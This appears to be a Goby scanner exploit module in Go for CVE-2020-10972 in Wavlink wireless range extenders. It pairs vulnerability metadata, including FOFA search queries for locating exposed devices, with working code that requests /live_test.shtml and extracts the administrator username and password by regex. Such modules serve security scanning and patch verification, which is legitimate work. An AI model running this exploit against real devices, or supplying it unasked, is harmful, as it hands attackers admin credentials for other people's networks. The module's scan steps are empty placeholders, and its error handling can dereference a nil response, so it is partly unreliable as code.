package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
)

func init() {
	expJson := `{
    "Name": "Wavlink wireless network signal extender live_test.shtml information leakage vulnerability (CVE-2020-10972)",
    "Description": "<p>Wavlink WL-WN530HG4, WN531G3, WN572HG3 are wireless network signal extenders from China Ruin Technology (Wavlink) Company.</p><p>Wavlink WL-WN530HG4, WN531G3, WN572HG3 have an information leakage vulnerability. An attacker can use this vulnerability to obtain the administrator user and password of the device.</p>",
    "Product": "WAVLINK-Wi-Fi-APP",
    "Homepage": "https://www.wavlink.com/en_us/index.html",
    "DisclosureDate": "2020-05-07",
    "Author": "2075068490@qq.com",
    "FofaQuery": "title=\"Wi-Fi APP Login\" || body=\"images/WAVLINK-logo.png\"",
    "GobyQuery": "title=\"Wi-Fi APP Login\" || body=\"images/WAVLINK-logo.png\"",
    "Level": "2",
    "Impact": "<p>Wavlink WL-WN530HG4, WN531G3, WN572HG3 have an information leakage vulnerability. An attacker can use this vulnerability to obtain the administrator user and password of the device.</p>",
    "Recommendation": "<p>1. The manufacturer has released a solution, please upgrade to the latest version: <a href=\"https://www.wavlink.com/en_us/firmware.html\">https://www.wavlink.com/en_us/firmware.html</a></p><p>2. If not necessary, public network access to the system is prohibited.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        "CVE-2020-10972"
    ],
    "CNNVD": [
        "CNNVD-202005-272"
    ],
    "CNVD": [
        "CNVD-2020-41784"
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Wavlink 无线网络信号扩展器 live_test.shtml 信息泄露漏洞（CVE-2020-10972）",
            "Product": "WAVLINK-Wi-Fi-APP",
            "Description": "<p>Wavlink WL-WN530HG4，WN531G3，WN572HG3 是中国睿因科技（Wavlink）公司的无线网络信号扩展器。</p><p>Wavlink WL-WN530HG4，WN531G3，WN572HG3 存在信息泄露漏洞，攻击者可以通过该漏洞得到设备的管理员用户和密码。</p>",
            "Recommendation": "<p>1、厂商已发布解决方案，请升级至最新版本：<a href=\"https://www.wavlink.com/en_us/firmware.html\" target=\"_blank\">https://www.wavlink.com/en_us/firmware.html</a><br></p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>Wavlink WL-WN530HG4，WN531G3，WN572HG3 存在信息泄露漏洞，攻击者可以通过该漏洞得到设备的管理员用户和密码。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Wavlink wireless network signal extender live_test.shtml information leakage vulnerability (CVE-2020-10972)",
            "Product": "WAVLINK-Wi-Fi-APP",
            "Description": "<p>Wavlink WL-WN530HG4, WN531G3, WN572HG3 are wireless network signal extenders from China Ruin Technology (Wavlink) Company.</p><p>Wavlink WL-WN530HG4, WN531G3, WN572HG3 have an information leakage vulnerability. An attacker can use this vulnerability to obtain the administrator user and password of the device.</p>",
            "Recommendation": "<p>1. The manufacturer has released a solution, please upgrade to the latest version: <a href=\"https://www.wavlink.com/en_us/firmware.html\">https://www.wavlink.com/en_us/firmware.html</a></p><p>2. If not necessary, public network access to the system is prohibited.</p>",
            "Impact": "<p>Wavlink WL-WN530HG4, WN531G3, WN572HG3 have an information leakage vulnerability. An attacker can use this vulnerability to obtain the administrator user and password of the device.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-12-07",
    "PocId": "10896"
}`
	sendSiteIdPayload521dgwqf := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		sendConfig := httpclient.NewGetRequestConfig("/live_test.shtml")
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, sendConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			resp, _ := sendSiteIdPayload521dgwqf(hostInfo)
			return resp != nil && resp.StatusCode == 200 && regexp.MustCompile(`var syspasswd="(.*?)";`).MatchString(resp.Utf8Html)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if resp, err := sendSiteIdPayload521dgwqf(expResult.HostInfo); resp.StatusCode == 200 && regexp.MustCompile(`var syspasswd="(.*?)";`).MatchString(resp.Utf8Html) && regexp.MustCompile(`var username="(.*?)";`).MatchString(resp.Utf8Html) {
				username := regexp.MustCompile(`var username="(.*?)";`).FindStringSubmatch(resp.Utf8Html)[1]
				password := regexp.MustCompile(`var syspasswd="(.*?)";`).FindStringSubmatch(resp.Utf8Html)[1]
				expResult.Success = true
				expResult.Output = "username: " + username + "\n" + "password: " + password
			} else if err != nil {
				expResult.Output = err.Error()
			} else {
				expResult.Output = `漏洞利用失败`
			}
			return expResult
		},
	))
}
